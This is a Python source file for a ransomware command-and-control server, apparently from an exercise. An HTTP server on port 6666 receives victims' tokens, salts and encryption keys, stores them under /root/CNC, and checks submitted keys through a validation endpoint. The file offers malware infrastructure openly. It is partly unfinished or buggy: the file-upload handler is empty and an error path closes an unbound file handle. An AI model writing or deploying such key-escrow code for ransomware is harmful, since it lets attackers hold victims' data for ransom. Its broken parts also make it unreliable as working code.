import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from requests import Response


from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        
        os.makedirs('/root/CNC', exist_ok=True)
        print(os.listdir())

        token = base64.b64decode(body["token"])
        salt = base64.b64decode(body["salt"])
        key = base64.b64decode(body["key"])

        print("\n\nKey "+token.hex()+": ", str(base64.b64encode(key), encoding="utf-8"))

        # Create folder's name
        #m = sha256()
        #m.update(token)
        folder_token_name = "/root/CNC/" + str(token.hex()) #str(m.hexdigest())

        os.makedirs(folder_token_name, exist_ok=True)

        # LOG
        os.chdir(folder_token_name)

        with open(folder_token_name + "/key.bin", "wb") as f:
            f.write(key)

        with open(folder_token_name + "/salt.bin", "wb") as f:
            f.write(salt)


        print(os.getcwd()) 
        print(os.listdir())

        return {"status":"KO"}

    def post_files(self, path:str, params:dict, body:dict)->dict:
        os.makedirs("/root/CNC/files/")
        os.chdir("/root/CNC/files")
        for file in body:
            pass

    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_key(self, path:str, params:dict, body:dict)->dict:

        token = base64.b64decode(body["token"])
        #m = sha256()
        #m.update(token)
        folder_token_name = "/root/CNC/" + token.hex() # str(m.hexdigest())
        file_path = folder_token_name + "/key.bin"
        
        key_rcv = base64.b64decode(body["key"])

        try:
            f = open(file_path, "rb")
            key = f.read()
        except:
            f.close()
            return {"valide":-1}
        f.close()
        print(key_rcv)
        print(key)
        if(key_rcv == key):

            return {"valide": 1}

        return {"valide": 0}

httpd = HTTPServer(('0.0.0.0', 6666), CNC)
print("Httpd starting...")
httpd.serve_forever()